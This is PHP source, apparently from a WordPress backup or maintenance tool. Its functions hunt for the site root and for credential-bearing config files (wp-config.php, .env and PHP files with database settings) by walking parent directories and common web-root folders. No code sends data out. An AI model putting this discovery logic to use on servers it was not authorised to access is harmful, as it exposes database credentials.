function ba_is_wp_root($dir)
{
    if (!is_dir($dir) || !is_readable($dir)) {
        return false;
    }
    $rp = @realpath($dir);
    $check = $rp ? $rp : $dir;
    return (is_file($check . '/wp-load.php') && is_dir($check . '/wp-includes'));
}

function ba_resolve_config_path($file)
{
    if (!is_readable($file)) {
        return $file;
    }
    $txt = @file_get_contents($file);
    if ($txt !== false && preg_match('/require(?:_once)?\s*(?:\(?\s*)[\'"]([^\'"]+)[\'"]/', $txt, $m)) {
        $inc = $m[1];
        if ($inc !== '' && $inc[0] !== '/' && $inc[0] !== '\\' && strpos($inc, ':') !== 1) {
            $inc = dirname($file) . '/' . $inc;
        }
        $rp = @realpath($inc);
        if ($rp && is_file($rp) && ba_is_wp_config($rp)) {
            return $rp;
        }
        if (is_file($inc) && ba_is_wp_config($inc)) {
            return $inc;
        }
    }
    return $file;
}

function ba_locate_config_file($base)
{
    if (is_file($base) && ba_is_wp_config($base)) {
        return ba_resolve_config_path($base);
    }
    $dirs = ba_dirs_to_search_config($base);
    $alt = ba_config_alt_filenames();
    $i = 0;
    $dn = count($dirs);
    for ($i = 0; $i < $dn; $i++) {
        $dir = $dirs[$i];
        $j = 0;
        $an = count($alt);
        for ($j = 0; $j < $an; $j++) {
            $c = $dir . '/' . $alt[$j];
            if (is_file($c) && ba_is_wp_config($c)) {
                return ba_resolve_config_path($c);
            }
        }
        $env = $dir . '/.env';
        if (is_file($env)) {
            $ep = ba_parse_env_file($env);
            if ($ep['ok']) {
                return $env;
            }
        }
        $hit = ba_scan_php_for_db_config($dir, 30);
        if ($hit !== '') {
            return $hit;
        }
    }
    return '';
}

function ba_root_from_config_file($config_file)
{
    $cfg = ba_resolve_config_path($config_file);
    $dir = dirname($cfg);
    $dir_rp = @realpath($dir);
    $dir_use = $dir_rp ? $dir_rp : $dir;
    if (ba_is_wp_root($dir_use)) {
        return $dir_use;
    }
    $subs = array('public_html', 'www', 'html', 'htdocs', 'web', 'wordpress', 'wp', 'blog', 'site');
    $i = 0;
    $sn = count($subs);
    for ($i = 0; $i < $sn; $i++) {
        $candidate = $dir_use . '/' . $subs[$i];
        if (ba_is_wp_root($candidate)) {
            $rp = @realpath($candidate);
            return $rp ? $rp : $candidate;
        }
    }
    $parent = @realpath($dir_use . '/..');
    if ($parent && ba_is_wp_root($parent)) {
        return $parent;
    }
    return $dir_use;
}

function ba_try_config_at($path)
{
    if (is_file($path) && ba_is_wp_config($path)) {
        return ba_root_from_config_file($path);
    }
    $cfg = ba_locate_config_file($path);
    if ($cfg !== '') {
        return ba_root_from_config_file($cfg);
    }
    if (ba_is_wp_root($path)) {
        $rp = @realpath($path);
        return $rp ? $rp : $path;
    }
    $rp = @realpath($path);
    if ($rp && ba_is_wp_root($rp)) {
        return $rp;
    }
    return '';
}

function ba_collect_anchors()
{
    $anchors = array();
    $here = realpath(dirname(__FILE__));
    if ($here) {
        $anchors[$here] = 1;
        $p = $here;
        $i = 0;
        for ($i = 0; $i < 10; $i++) {
            $parent = realpath($p . '/..');
            if (!$parent || $parent === $p) {
                break;
            }
            $anchors[$parent] = 1;
            $p = $parent;
        }
    }
    $root = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : false;
    if ($root) {
        $anchors[$root] = 1;
        $subs = array('wordpress', 'wp', 'blog', 'public_html', 'html', 'www', 'htdocs');
        $i = 0;
        $sn = count($subs);
        for ($i = 0; $i < $sn; $i++) {
            $sp = realpath($root . '/' . $subs[$i]);
            if ($sp) {
                $anchors[$sp] = 1;
            }
        }
    }
    return array_keys($anchors);
}

